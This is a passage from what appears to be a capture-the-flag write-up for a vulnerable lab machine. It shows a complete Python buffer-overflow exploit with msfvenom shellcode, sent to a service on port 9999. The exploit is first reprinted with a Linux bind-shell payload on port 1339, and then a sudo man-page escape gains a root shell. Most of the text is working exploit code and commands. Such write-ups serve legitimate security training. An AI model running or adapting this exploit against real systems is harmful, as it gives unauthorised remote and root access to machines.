shellcode += b"\x0f\xcc\x01\x49\xaa\x87\xac\x9e\xc7\xca\xb8"
shellcode += b"\x53\xea\xf4\x38\xfc\x7d\x87\x0a\xa3\xd5\x0f"
shellcode += b"\x27\x2c\xf0\xc8\x48\x07\x44\x46\xb7\xa8\xb5"
shellcode += b"\x4f\x7c\xfc\xe5\xe7\x55\x7d\x6e\xf7\x5a\xa8"
shellcode += b"\x1b\xff\xfd\x03\x3e\x02\xbd\xf3\xfe\xac\x56"
shellcode += b"\x1e\xf1\x93\x47\x21\xdb\xbc\xe0\xdc\xe4\xc7"
shellcode += b"\xcb\x69\x02\xad\x3b\x3c\x9c\x59\xfe\x1b\x15"
shellcode += b"\xfe\x01\x4e\x0d\x68\x49\x98\x8a\x97\x4a\x8e"
shellcode += b"\xbc\x0f\xc1\xdd\x78\x2e\xd6\xcb\x28\x27\x41"
shellcode += b"\x81\xb8\x0a\xf3\x96\x90\xfc\x90\x05\x7f\xfc"
shellcode += b"\xdf\x35\x28\xab\x88\x88\x21\x39\x25\xb2\x9b"
shellcode += b"\x5f\xb4\x22\xe3\xdb\x63\x97\xea\xe2\xe6\xa3"
shellcode += b"\xc8\xf4\x3e\x2b\x55\xa0\xee\x7a\x03\x1e\x49"
shellcode += b"\xd5\xe5\xc8\x03\x8a\xaf\x9c\xd2\xe0\x6f\xda"
shellcode += b"\xda\x2c\x06\x02\x6a\x99\x5f\x3d\x43\x4d\x68"
shellcode += b"\x46\xb9\xed\x97\x9d\x79\x0d\x7a\x37\x74\xa6"
shellcode += b"\x23\xd2\x35\xab\xd3\x09\x79\xd2\x57\xbb\x02"
shellcode += b"\x21\x47\xce\x07\x6d\xcf\x23\x7a\xfe\xba\x43"
shellcode += b"\x29\xff\xee"

payload = offset + b"\xF3\x12\x17\x31" + b"\x90"*32 + shellcode # b"\xF3\x12\x17\x31" 

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, 9999))
s.send(payload)
s.close()
```

Now we restart Immunity Debugger as administrator and attach the process and run the exploit.py. 


![grafik](https://github.com/fortyfourh/CTF-writeups/assets/125758265/21a88f16-f961-4630-9efa-d227732ead90)


We successfully exploited the buffer overflow vulnerability on our windows machine. Now we adjust our exploit to make it work on linux by regenerating the shellcode using a different payload type:


```
msfvenom -p linux/x86/shell_bind_tcp RHOST=*linux_machine_ip* LPORT=1339 EXITFUNC=thread -f python -a x86 -b "\x00" -v shellcode
```

We also have to change the IP in the exploit.py. Our exploit.py will look like the following:


```
#!/usr/bin/env python3

import socket
import time

ip = "linux-machine ip"
# 311712F3
offset = b"A"*524

shellcode =  b""
shellcode += b"\xda\xd6\xb8\x75\x84\x46\x65\xd9\x74\x24\xf4"
shellcode += b"\x5f\x31\xc9\xb1\x14\x31\x47\x19\x03\x47\x19"
shellcode += b"\x83\xc7\x04\x97\x71\x77\xbe\xa0\x99\x2b\x03"
shellcode += b"\x1d\x34\xce\x0a\x40\x78\xa8\xc1\x02\x22\x6b"
shellcode += b"\x88\x6a\xd7\x93\x29\x51\xbd\x83\x60\xf5\xc8"
shellcode += b"\x45\xe8\x93\x92\x48\x6d\xd2\x62\x57\xdd\xe0"
shellcode += b"\xd4\x31\xec\x68\x57\x0e\x88\xa5\xd8\xfd\x0c"
shellcode += b"\x5f\xe6\x59\x62\x1f\x51\x23\x84\x77\x4d\xfc"
shellcode += b"\x07\xef\xf9\x2d\x8a\x86\x97\xb8\xa9\x08\x3b"
shellcode += b"\x32\xcc\x18\xb0\x89\x8f"

payload = offset + b"\xF3\x12\x17\x31" + b"\x90"*32 + shellcode 

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, 9999))
s.send(payload)
s.close()
```


After running the exploit, the port 1339 is open and we can connect to it:
![grafik](https://github.com/fortyfourh/CTF-writeups/assets/125758265/39f9b4d3-02e9-48f5-bf84-0abecca70b1a)



## Privilege Escalation

Once connected to the target machine, we will upgrade our shell to get a more interactive shell:


```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```


Any command we run is run by the user "puck". By running sudo -l, we see that we can run the binary anansi_util as root user without a password:
![grafik](https://github.com/fortyfourh/CTF-writeups/assets/125758265/55d10779-c9f5-41f3-805c-bcd58aabcad1)

We run the binary and find out that it opens the manual (man page), which we can use to get a root shell:

![grafik](https://github.com/fortyfourh/CTF-writeups/assets/125758265/9edf15f7-69a5-42c0-b270-03a3ce3fb15b)


Finally, we can enter


```
!/bin/bash
```


to get a root shell:

![grafik](https://github.com/fortyfourh/CTF-writeups/assets/125758265/9cbd4bf0-d2be-4205-9bf3-8c013f167c19)
![grafik](https://github.com/fortyfourh/CTF-writeups/assets/125758265/1dc7f8f5-4fc5-4075-94dc-ddc3ade49b18)

